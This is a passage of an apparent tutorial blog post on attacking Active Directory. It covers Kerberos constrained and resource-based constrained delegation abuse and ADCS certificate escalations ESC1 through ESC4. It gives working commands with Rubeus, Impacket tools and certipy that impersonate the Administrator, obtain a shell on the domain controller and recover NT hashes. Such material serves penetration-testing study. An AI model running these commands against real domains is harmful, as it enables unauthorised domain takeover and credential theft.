of <code class="language-plaintext highlighter-rouge">ST</code>.</p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">Protocol Transition</code> (PT) is the name of this mechanism. <code class="language-plaintext highlighter-rouge">PT</code> is the mechanism that allows connection from other protocols than <code class="language-plaintext highlighter-rouge">Kerberos</code> on a <code class="language-plaintext highlighter-rouge">Kerberos</code> environment. It does not allow a connection from another protocol, it allows a delegation from another protocol to kerberos.</p></div></blockquote><p>This is where the <code class="language-plaintext highlighter-rouge">Protocol transition</code> (PT) enter the scene. This will allow us to get a valid ST for our own service using <code class="language-plaintext highlighter-rouge">S4U2Self</code> for the user that just authenticated using <code class="language-plaintext highlighter-rouge">Net-NTLM</code> or an attacker can use it to impersonate any user on our service machine like the admin for example.</p><p><code class="language-plaintext highlighter-rouge">S4U2Self</code> produces forwardable tickets only if the user is not a member of the <code class="language-plaintext highlighter-rouge">protected user</code> group or if it does not have the <code class="language-plaintext highlighter-rouge">UAC NOT_DELEGATED</code> attribute set. It will be important for <code class="language-plaintext highlighter-rouge">S4U2Proxy</code>.</p><h4 id="s4u2proxy"><span class="mr-2">S4U2Proxy</span><a href="#s4u2proxy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><code class="language-plaintext highlighter-rouge">S4U2Proxy</code> as <code class="language-plaintext highlighter-rouge">S4U2Self</code> is also an extension of <code class="language-plaintext highlighter-rouge">Kerberos</code>. It allows the delegation server to ask for a <code class="language-plaintext highlighter-rouge">ST</code> for “any” user and use it on any service on which it has permission to delegate (only works with <code class="language-plaintext highlighter-rouge">Kerberos</code>). To be able to do that, <code class="language-plaintext highlighter-rouge">S4U2Proxy</code> needs a <code class="language-plaintext highlighter-rouge">forwardable ST</code>. The <code class="language-plaintext highlighter-rouge">forwardable</code> flag of a <code class="language-plaintext highlighter-rouge">ST</code> can be obtained thanks to <code class="language-plaintext highlighter-rouge">S4U2Self</code> (only if the two upper conditions specified in the <code class="language-plaintext highlighter-rouge">S4U2Self</code> section are not set).</p><h4 id="constrained-delegation"><span class="mr-2">Constrained Delegation</span><a href="#constrained-delegation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Then the <code class="language-plaintext highlighter-rouge">Constrained Delegation</code> was created. Here, the constrained delegation server can only impersonate users on specific services. As you can see on the bellow schema, the user can be impersonated only on the file server and not on the two other.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: center"><img data-src="https://en.hackndo.com/assets/uploads/2019/02/constrained_delegation_schema.png" alt="[constrained_delegation_schema.png]" data-proofer-ignore><tbody><tr><td style="text-align: center"><strong>Source: HacknDo</strong></table></div><p>The <code class="language-plaintext highlighter-rouge">Contrained Delegation</code> server ask the DC (Domain Controller) if it can receive a <code class="language-plaintext highlighter-rouge">ST</code> (Service Ticket) as the specified user. This is possible thanks to <a href="#S4U2Proxy">S4U2Proxy</a>.</p><blockquote class="prompt-info"><div><p>Note that the information about if the <code class="language-plaintext highlighter-rouge">Constrained Delegation</code> server is allowed or not to impersonate a user on a specific server is stored in the DC not on the <code class="language-plaintext highlighter-rouge">Constrained Delegation</code> server.</p></div></blockquote><blockquote class="prompt-warning"><div><p>Only DA (Domain Admin) can change the delegation rights.</p></div></blockquote><p>To exploit the <code class="language-plaintext highlighter-rouge">Constrained Delegation</code>, we first need to find it using the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>findDelegation.py <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASSWORD</span> <span class="nt">-target-domain</span> <span class="nv">$TARGET_DOMAIN</span>
</pre></table></code></div></div><p>Now there are two scenarios. The first one is if there is protocol transition on the service that has the right to delegate.</p><h5 id="with-protocol-transition"><span class="mr-2">With protocol transition</span><a href="#with-protocol-transition" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>In this case, we first need to ask a <code class="language-plaintext highlighter-rouge">TGT</code> for the user we want to impersonate, then execute S4U2Self followed by S4U2Proxy to impersonate the administrator.</p><p>For Windows, you can use <code class="language-plaintext highlighter-rouge">Rubeus</code>:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:</span><span class="nv">$USER</span><span class="w"> </span><span class="nx">/domain:</span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="nx">/password:</span><span class="nv">$PASSWORD</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/ticket:</span><span class="nv">$TICKET</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/msdsspn:CIFS/</span><span class="nv">$DC_NAME</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Or on Linux:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>getST.py <span class="nt">-spn</span> <span class="s2">"CIFS/</span><span class="nv">$DC_NAME</span><span class="s2">"</span> <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASSWORD</span>
</pre></table></code></div></div><p>With the received ticket, we can export it and then use it to connect to the machine with tools like <code class="language-plaintext highlighter-rouge">smbexec</code>, <code class="language-plaintext highlighter-rouge">psexec</code>, <code class="language-plaintext highlighter-rouge">wmiexec</code>…</p><blockquote class="prompt-info"><div><p>You need to export the ticket using the <code class="language-plaintext highlighter-rouge">export KRB5CCNAME=/PATH/TO/ticket.ccache</code> command</p></div></blockquote><h5 id="without-protocol-transition"><span class="mr-2">Without Protocol transition</span><a href="#without-protocol-transition" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>In this case, we need a forwardable <code class="language-plaintext highlighter-rouge">ST</code> as the administrator to any service on the server. Here, we can’t just ask for the <code class="language-plaintext highlighter-rouge">ST</code> like we did earlier with protocol transition so we need to create a machine and add delegation from our created machine to the server (that has delegation). Why would we do that ? Because the resulted <code class="language-plaintext highlighter-rouge">ST</code> from our created machine is a forwardable ticket on the server (that has delegation).</p><p>First, we create our machine:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>addcomputer.py <span class="nt">-computer-name</span> <span class="s1">'rbcd_created_machine$'</span> <span class="nt">-computer-pass</span> <span class="s1">'rbcdpass'</span> <span class="nt">-dc-host</span> <span class="nv">$DC_IP</span> <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASSWORD</span>
</pre></table></code></div></div><p>Now, we add the <code class="language-plaintext highlighter-rouge">RBCD</code> from <code class="language-plaintext highlighter-rouge">rbcd_created_machine$</code> to the server with <code class="language-plaintext highlighter-rouge">Constrained Delegation</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rbcd.py <span class="nt">-delegate-from</span> <span class="s1">'rbcd_created_machine$'</span> <span class="nt">-delegate-to</span> <span class="nv">$SERVER_NAME_WITH_DELEGATION</span> <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="nt">-action</span> <span class="s1">'write'</span> <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$SERVER_HASH</span><span class="s2">"</span> <span class="nv">$DOMAIN</span>/<span class="nv">$SERVER_NAME_WITH_DELEGATION</span>
</pre></table></code></div></div><p>Now that everything is set up, we can use <code class="language-plaintext highlighter-rouge">S4U2Slef</code> followed by <code class="language-plaintext highlighter-rouge">S4U2Proxy</code> on the server with delegation.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># s4u2self on rbcd_created_machine</span>
getST.py <span class="nt">-self</span> <span class="nt">-impersonate</span> <span class="s2">"administrator"</span> <span class="nt">-dc-ip</span> 192.168.56.11  north.sevenkingdoms.local/<span class="s1">'rbcd_created_machine$'</span>:<span class="s1">'rbcdpass'</span>

<span class="c"># s4u2proxy from rbcd_created_machine to $SERVER_NAME_WITH_DELEGATION</span>
getST.py <span class="nt">-impersonate</span> <span class="s2">"administrator"</span> <span class="nt">-spn</span> <span class="s2">"host/</span><span class="nv">$SERVER_NAME_WITH_DELEGATION</span><span class="s2">"</span> <span class="nt">-additional-ticket</span> <span class="s1">'TICKET_NAME.ccache'</span> <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span>  <span class="nv">$DOMAIN</span>/<span class="s1">'rbcd_created_machine$'</span>:<span class="s1">'rbcdpass'</span>
</pre></table></code></div></div><p>or using only one command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>getST.py <span class="nt">-spn</span> <span class="s2">"host/</span><span class="nv">$SERVER_NAME_WITH_DELEGATION</span><span class="s2">"</span> <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span>  <span class="nv">$DOMAIN</span>/<span class="s1">'rbcd_created_machine$'</span>:<span class="s1">'rbcdpass'</span>
</pre></table></code></div></div><p>And finally, we use our forwardable ticket we just received to get a <code class="language-plaintext highlighter-rouge">ST</code> as the administrator on the <code class="language-plaintext highlighter-rouge">DC</code> and connect to it:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>getST.py <span class="nt">-impersonate</span> <span class="s2">"administrator"</span> <span class="nt">-spn</span> <span class="s2">"http/</span><span class="nv">$DC_NAME</span><span class="s2">"</span> <span class="nt">-altservice</span> <span class="s2">"cifs/</span><span class="nv">$DC_NAME</span><span class="s2">"</span> <span class="nt">-additional-ticket</span> <span class="s1">'TICKET_OF_ADMIN_OF_SERVER.ccache'</span> <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$SERVER_HASH</span><span class="s2">"</span> <span class="nv">$DOMAIN</span>/<span class="nv">$SERVER_NAME_WITH_DELEGATION</span>

<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/PATH/TO/TICKET_OF_ADMIN_OF_DC.ccache 
wmiexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nv">$DOMAIN$/</span>administrator@<span class="nv">$DC_NAME</span>
</pre></table></code></div></div><h4 id="resource-based-constrained-delegation"><span class="mr-2">Resource Based Constrained Delegation</span><a href="#resource-based-constrained-delegation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><code class="language-plaintext highlighter-rouge">Resource Based Constrained Delegation</code> (RBCD) works the other way around. It is not the <code class="language-plaintext highlighter-rouge">RBCD</code> server that checks if it has the right to impersonate the service (ex: web server).The machine account can change its own attribute and not only the DA can change it on the DC. If the machine is compromised, then we can get the hash of the machine account and then continue the attack. This means that if you create a machine (MachineAccountQuota &gt; 0) then you can specify that a specific server can impersonate your machine.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: center"><img data-src="https://en.hackndo.com/assets/uploads/2019/02/resource_based_constrained_delegation_schema.png" alt="[resource_based_constrained_delegation_schema.png]" data-proofer-ignore><tbody><tr><td style="text-align: center"><strong>Source: HacknDo</strong></table></div><p>To exploit an <code class="language-plaintext highlighter-rouge">RBCD</code>, we first need to create a machine:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>addcomputer.py <span class="nt">-computer-name</span> <span class="s1">'rbcd_created_machine$'</span> <span class="nt">-computer-pass</span> <span class="s1">'rbcdpass'</span> <span class="nt">-dc-host</span> <span class="nv">$DC_IP</span> <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASSWORD</span>
</pre></table></code></div></div><p>Now, we add the <code class="language-plaintext highlighter-rouge">RBCD</code> from <code class="language-plaintext highlighter-rouge">rbcd_created_machine$</code> to the server with <code class="language-plaintext highlighter-rouge">RBCD</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rbcd.py <span class="nt">-delegate-from</span> <span class="s1">'rbcd_created_machine$'</span> <span class="nt">-delegate-to</span> <span class="nv">$SERVER_NAME_WITH_DELEGATION</span> <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="nt">-action</span> <span class="s1">'write'</span> <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$SERVER_HASH</span><span class="s2">"</span> <span class="nv">$DOMAIN</span>/<span class="nv">$SERVER_NAME_WITH_DELEGATION</span>
</pre></table></code></div></div><p>Our created machine has now delegation permission on our target, we can now use <code class="language-plaintext highlighter-rouge">S4U2Self</code> followed by <code class="language-plaintext highlighter-rouge">S4U2Proxy</code> and get an administrator ticket for the <code class="language-plaintext highlighter-rouge">DC</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>getST.py <span class="nt">-spn</span> <span class="s2">"cifs/</span><span class="nv">$DC_SPN</span><span class="s2">"</span> <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="nv">$DOMAIN</span>/<span class="s1">'rbcd_created_machine$'</span>:rbcdpass

<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>TICKET_OF_ADMIN_OF_DC
wmiexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> @<span class="nv">$DC_SPN</span>
</pre></table></code></div></div><h3 id="adcs"><span class="mr-2">ADCS</span><a href="#adcs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><code class="language-plaintext highlighter-rouge">ADCS</code> or <code class="language-plaintext highlighter-rouge">Active Directory Certificate Services</code> is Microsoft’s PKI (Public Key Infrastructure). This means that <code class="language-plaintext highlighter-rouge">ADCS</code> allows integrity, authentication, non repudiation and confidentiality. Here we will be talking about <code class="language-plaintext highlighter-rouge">ESC1</code> to <code class="language-plaintext highlighter-rouge">ESC8</code> used for domain escalation. <code class="language-plaintext highlighter-rouge">ESC</code> stand for <code class="language-plaintext highlighter-rouge">Escalation</code>.</p><p>The main idea is that if you have enough rights, you can ask for certificates for a specific user, recover its <code class="language-plaintext highlighter-rouge">NT</code> hash and pass it or crack it.</p><p>Those appellations <code class="language-plaintext highlighter-rouge">ESCX</code> come from <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">this paper</a> from <a href="https://twitter.com/harmj0y">Will Schroeder</a> and <a href="https://twitter.com/tifkin_">Lee Christensen</a> also explained <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">in this blog</a> in a funnier way :).</p><p>Here are the meaning of each <code class="language-plaintext highlighter-rouge">ESC</code> based on this paper:</p><ul><li><p><code class="language-plaintext highlighter-rouge">ESC1</code>: Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</p><li><p><code class="language-plaintext highlighter-rouge">ESC2</code>: Domain escalation via No Issuance Requirements + Enrollable Any Purpose EKU or no EKU</p><li><p><code class="language-plaintext highlighter-rouge">ESC3</code>: Domain escalation via No Issuance Requirements + Certificate Request Agent EKU + no enrollment agent restrictions</p><li><p><code class="language-plaintext highlighter-rouge">ESC4</code>: Domain escalation via misconfigured certificate template access control</p><li><p><code class="language-plaintext highlighter-rouge">ESC5</code>: Domain escalation via vulnerable PKI AD Object Access Control</p><li><p><code class="language-plaintext highlighter-rouge">ESC6</code>: Domain escalation via the EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CAs + No Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates</p><li><p><code class="language-plaintext highlighter-rouge">ESC7</code>: Vulnerable Certificate Authority Access Control</p><li><p><code class="language-plaintext highlighter-rouge">ESC8</code>: NTLM Relay to AD CS HTTP Endpoints</p></ul><p>Well this is a lot… But we have a wonderful tool that allows us to check if the <code class="language-plaintext highlighter-rouge">ADCS</code> is vulnerable and can also be used to exploit it. Please welcome <a href="https://github.com/ly4k/Certipy">certipy</a>!!!</p><h4 id="vulnerable-adcs"><span class="mr-2">Vulnerable ADCS</span><a href="#vulnerable-adcs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To check if an <code class="language-plaintext highlighter-rouge">ADCS</code> is vulnerable, you will have to run the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy find <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">"</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$PASSWORD</span><span class="s2">"</span> <span class="nt">-dc-ip</span> <span class="s2">"</span><span class="nv">$DC_IP</span><span class="s2">"</span> <span class="nt">-vulnerable</span>
</pre></table></code></div></div><p>The output should look like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>Certificate Authorities
 0
   CA Name                             : CORP-CA
   DNS Name                            : CA.CORP.LOCAL
   ...
   Web Enrollment
     HTTP
       Enabled                         : False
     HTTPS
       Enabled                         : True
       Channel Binding (EPA)           : False
   ...
   Permissions
     Access Rights
       ManageCa                        : CORP.LOCAL\Authenticated Users
       ManageCertificates              : CORP.LOCAL\Authenticated Users
       Read                            : CORP.LOCAL\Authenticated Users
       Enroll                          : CORP.LOCAL\Authenticated Users
   [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
   [+] User ACL Principals             : CORP.LOCAL\Authenticated Users
   [!] Vulnerabilities
     ESC7                              : User has dangerous permissions.
     ESC8                              : Web Enrollment is enabled over HTTPS and Channel Binding is disabled.
Certificate Templates
  0
    Template Name                       : UserTemplate
    Display Name                        : UserTemplate
    Certificate Authorities             : CORP-CA
    Enabled                             : True
    Client Authentication               : True
    ...
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    ...
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CORP.LOCAL\Domain Users
      Object Control Permissions
        Write Property Enroll           : CORP.LOCAL\Domain Users
    [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
</pre></table></code></div></div><h5 id="esc1"><span class="mr-2">ESC1</span><a href="#esc1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>As you can see, the <code class="language-plaintext highlighter-rouge">CA</code> (Certificate Authority) is vulnerable to <code class="language-plaintext highlighter-rouge">ESC1</code>. To be able to exploit it you can recover the admin certificate:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-target</span> <span class="nv">$CA_SERVER</span>.<span class="nv">$DOMAIN</span>.local <span class="nt">-template</span> ESC1 <span class="nt">-ca</span> <span class="nv">$CA_NAME</span> <span class="nt">-upn</span> administrator@<span class="nv">$DOMAIN</span>.local
</pre></table></code></div></div><p>Now, we should have a file called <code class="language-plaintext highlighter-rouge">administrator.pfx</code>. With this file, we can use it to recover the administrator <code class="language-plaintext highlighter-rouge">NT</code> hash:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span>
</pre></table></code></div></div><h5 id="esc2-esc3"><span class="mr-2">ESC2 /ESC3</span><a href="#esc2-esc3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>With <code class="language-plaintext highlighter-rouge">ESC2</code> and <code class="language-plaintext highlighter-rouge">ESC3</code> are using the enrolment agent to request a certificate. As for <code class="language-plaintext highlighter-rouge">ESC1</code>, we use <code class="language-plaintext highlighter-rouge">certipy</code> to request a certificate:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-target</span> <span class="nv">$CA_SERVER</span>.<span class="nv">$DOMAIN</span>.local <span class="nt">-template</span> ESC2 <span class="nt">-ca</span> <span class="nv">$CA_NAME</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-target</span> <span class="nv">$CA_SERVER</span>.<span class="nv">$DOMAIN</span>.local <span class="nt">-template</span> User <span class="nt">-ca</span> <span class="nv">$CA_NAME</span> <span class="nt">-on-behalf-of</span> <span class="s1">'$NETBIOS_NAME\administrator'</span> <span class="nt">-pfx</span> <span class="nv">$OUR_USER</span>.pfx
</pre></table></code></div></div><p>Now that we have the admin certificate, we can use it to recover the <code class="language-plaintext highlighter-rouge">NT</code> hash:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span>
</pre></table></code></div></div><p>As you may have notice, we did this for the template <code class="language-plaintext highlighter-rouge">ESC2</code>, but we can run the following commands to exploit <code class="language-plaintext highlighter-rouge">ESC3-CRA</code> and <code class="language-plaintext highlighter-rouge">ESC3</code> templates:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-target</span> <span class="nv">$CA_SERVER</span>.<span class="nv">$DOMAIN</span>.local <span class="nt">-template</span> ESC3-CRA <span class="nt">-ca</span> <span class="nv">$CA_NAME</span>
</pre></table></code></div></div><p>Or</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-target</span> <span class="nv">$CA_SERVER</span>.<span class="nv">$DOMAIN</span>.local <span class="nt">-template</span> ESC3 <span class="nt">-ca</span> <span class="nv">$CA_NAME</span> <span class="nt">-on-behalf-of</span> <span class="s1">'$NETBIOS_NAME\administrator'</span> <span class="nt">-pfx</span> <span class="nv">$OUR_USER</span>.pfx
</pre></table></code></div></div><p>And finally get the <code class="language-plaintext highlighter-rouge">NT</code> hash:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-username</span> administrator <span class="nt">-domain</span> <span class="nv">$DOMAIN</span>.local <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span>
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Because the recovery of the <code class="language-plaintext highlighter-rouge">NT</code> hash is always the same command, I will not write this step anymore but you can check the <code class="language-plaintext highlighter-rouge">ESC1</code> and <code class="language-plaintext highlighter-rouge">ESC2/ESC3</code> to see how it is done.</p></div></blockquote><h5 id="esc4"><span class="mr-2">ESC4</span><a href="#esc4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>In <code class="language-plaintext highlighter-rouge">ESC4</code>, we will write privilege over a certificate template. Here, we are going to cheat a bit XD. We are not going to exploit <code class="language-plaintext highlighter-rouge">ESC4</code> as we did with the previous template exploit. Here, we are going to use <code class="language-plaintext highlighter-rouge">ESC4</code> to change the template and make it vulnerable to <code class="language-plaintext highlighter-rouge">ESC1</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy template <span class="nt">-u</span> <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-template</span> ESC4 <span class="nt">-save-old</span> <span class="nt">-debug</span>
